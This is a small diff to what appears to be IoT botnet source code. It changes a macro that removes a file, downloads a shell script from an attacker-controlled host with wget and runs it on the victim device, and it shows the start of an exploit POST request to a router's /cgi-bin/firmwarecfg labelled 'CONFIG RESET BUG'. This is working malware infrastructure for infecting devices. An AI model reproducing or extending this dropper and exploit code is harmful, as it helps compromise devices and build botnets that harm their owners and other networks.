@@ -24,7 +24,7 @@ int timeout_value;
 sock_t *scan_sp;
 pid_t pid, g_pid;
 
-#define getbinaries "rm -rf /var/run/getbinaries.sh; wget -c %s/getbinaries.sh -P /var/run && sh /var/run/getbinaries.sh&\n"
+#define getbinaries "rm -rf /var/run/cia.sh; wget -c %s/cia.sh -P /var/run && sh /var/run/cia.sh&\n"
 
 /* CONFIG RESET BUG: POST request. */
 #define post_request "POST /cgi-bin/firmwarecfg HTTP/1.1\r\n" \
